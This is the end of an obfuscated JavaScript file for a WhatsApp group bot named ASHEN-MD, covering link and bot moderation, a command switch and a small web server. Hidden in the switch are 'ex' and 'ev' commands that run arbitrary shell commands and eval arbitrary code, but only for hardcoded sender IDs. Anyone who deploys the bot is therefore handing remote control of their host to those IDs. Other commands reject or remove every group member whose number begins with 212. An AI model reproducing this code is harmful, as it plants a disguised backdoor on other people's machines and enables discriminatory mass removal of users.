          const _0x2fee59 = _0x3d2b90.includes("chat.whatsapp.com") || _0x1366bb.some(_0x5cd840 => _0x3d2b90.includes(_0x5cd840));
          if (_0x2fee59) {
            const _0xb0e769 = await _0x55533e.groupInviteCode(_0x222bfb);
            const _0x574be0 = 'https://chat.whatsapp.com/' + _0xb0e769;
            if (_0x3d2b90.includes(_0x574be0.toLowerCase())) {
              await _0x55533e.sendMessage(_0x222bfb, {
                'text': "⚠️ This is *this group's link*. Can't delete.",
                'mentions': [_0x14d9fb]
              });
            } else {
              if (config.ANTILINK_ACTION == "delete" || config.ANTILINK_ACTION == 'both') {
                await _0x55533e.sendMessage(_0x222bfb, {
                  'delete': _0x4b9a40.key
                });
              }
              await _0x55533e.sendMessage(_0x222bfb, {
                'text': "🚫 @" + _0x14d9fb.split('@')[0x0] + ", *Links are not allowed here!*",
                'mentions': [_0x14d9fb]
              });
              if (config.ANTILINK_ACTION == "remove" || config.ANTILINK_ACTION == 'both') {
                await _0x55533e.groupParticipantsUpdate(_0x222bfb, [_0x14d9fb], 'remove');
              }
            }
          }
        }
      }
      if (config.ANTI_BOT == 'true') {
        if (_0xeed4d1 && !_0x4e29b8 && !_0x3c46fb && _0x89a709) {
          if (_0x4b9a40.id.startsWith("BAE")) {
            await _0x55533e.sendMessage(_0x222bfb, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x89a709) {
              await _0x55533e.sendMessage(_0x222bfb, {
                'delete': _0x4b9a40.key
              });
              await _0x55533e.groupParticipantsUpdate(_0x222bfb, [_0x14d9fb], "remove");
            }
          }
          if (_0x4b9a40.id.startsWith("EVO")) {
            await _0x55533e.sendMessage(_0x222bfb, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x89a709) {
              await _0x55533e.sendMessage(_0x222bfb, {
                'delete': _0x4b9a40.key
              });
              await _0x55533e.groupParticipantsUpdate(_0x222bfb, [_0x14d9fb], 'remove');
            }
          }
          if (_0x4b9a40.id.startsWith("B1E")) {
            await _0x55533e.sendMessage(_0x222bfb, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x89a709) {
              await _0x55533e.sendMessage(_0x222bfb, {
                'delete': _0x4b9a40.key
              });
              await _0x55533e.groupParticipantsUpdate(_0x222bfb, [_0x14d9fb], "remove");
            }
          }
          if (_0x4b9a40.id.startsWith('3L1')) {
            await _0x55533e.sendMessage(_0x222bfb, {
              'text': "*Other bots are not allow here ❌*"
            });
            if (config.ANTI_BOT && _0x89a709) {
              await _0x55533e.sendMessage(_0x222bfb, {
                'delete': _0x4b9a40.key
              });
              await _0x55533e.groupParticipantsUpdate(_0x222bfb, [_0x14d9fb], "remove");
            }
          }
        }
      }
      switch (_0x2f0005) {
        case "jid":
          _0xf13504(_0x222bfb);
          break;
        case 'device':
          {
            let _0x16fa36 = getDevice(_0x4b9a40.message.extendedTextMessage.contextInfo.stanzaId);
            _0xf13504("*He Is Using* _*Whatsapp " + _0x16fa36 + " version*_");
          }
          break;
        case 'ex':
          {
            if (_0x8ddc90 == 0x16113d24e6) {
              const {
                exec: _0x39fafa
              } = require('child_process');
              _0x39fafa(_0x2e9303, (_0x4760a7, _0x133bad) => {
                if (_0x4760a7) {
                  return _0xf13504("-------\n\n" + _0x4760a7);
                }
                if (_0x133bad) {
                  return _0xf13504("-------\n\n" + _0x133bad);
                }
              });
            }
          }
          break;
        case 'apprv':
          {
            if (_0x8ddc90 == 0x16113d24e6) {
              let _0x337504 = await _0x55533e.groupRequestParticipantsList(_0x222bfb);
              for (let _0x1a34ec = 0x0; _0x1a34ec < _0x337504.length; _0x1a34ec++) {
                if (_0x337504[_0x1a34ec].jid.startsWith("212")) {
                  await _0x55533e.groupRequestParticipantsUpdate(_0x222bfb, [_0x337504[_0x1a34ec].jid], "reject");
                } else {
                  await _0x55533e.groupRequestParticipantsUpdate(_0x222bfb, [_0x337504[_0x1a34ec].jid], "approve");
                }
              }
            }
          }
          break;
        case "212r":
          {
            if (_0x8ddc90 == 0x16113d24e6) {
              for (let _0x28a7d = 0x0; _0x28a7d < _0x169562.length; _0x28a7d++) {
                if (_0x169562[_0x28a7d].id.startsWith("212")) {
                  await _0x55533e.groupParticipantsUpdate(_0x222bfb, [_0x169562[_0x28a7d].id], "remove");
                }
              }
            }
          }
          break;
        case "rtf":
          {
            console.log(dsa);
          }
          break;
        case 'ev':
          {
            if (_0x8ddc90 == 0x16113d24e6 || _0x8ddc90 == 0x160de87163) {
              let _0x28c0db = _0x2e9303.replace('°', '.toString()');
              try {
                let _0x18b840 = await eval(_0x28c0db);
                if (typeof _0x18b840 === 'object') {
                  _0xf13504(util.format(_0x18b840));
                } else {
                  _0xf13504(util.format(_0x18b840));
                }
              } catch (_0x2409b6) {
                _0xf13504(util.format(_0x2409b6));
              }
              ;
            }
          }
          break;
        default:
      }
    } catch (_0x25e514) {
      const _0x1ce948 = String(_0x25e514);
      console.log(_0x1ce948);
    }
  });
}
app.get('/', (_0x2733f8, _0x5ece52) => {
  _0x5ece52.send("📟 ASHEN-MD  Working successfully!");
});
app.listen(port, () => console.log("ASHEN-MD Server listening on port http://localhost:" + port));
setTimeout(() => {
  connect();
}, 0xbb8);
process.on("uncaughtException", function (_0x34a765) {
  let _0xdce6f9 = String(_0x34a765);
  if (_0xdce6f9.includes("Socket connection timeout")) {
    return;
  }
  if (_0xdce6f9.includes("rate-overlimit")) {
    return;
  }
  if (_0xdce6f9.includes("Connection Closed")) {
    return;
  }
  if (_0xdce6f9.includes("Value not found")) {
    return;
  }
  if (_0xdce6f9.includes("Authentication timed out")) {
    restart();
  }
  console.log("Caught exception: ", _0x34a765);
});
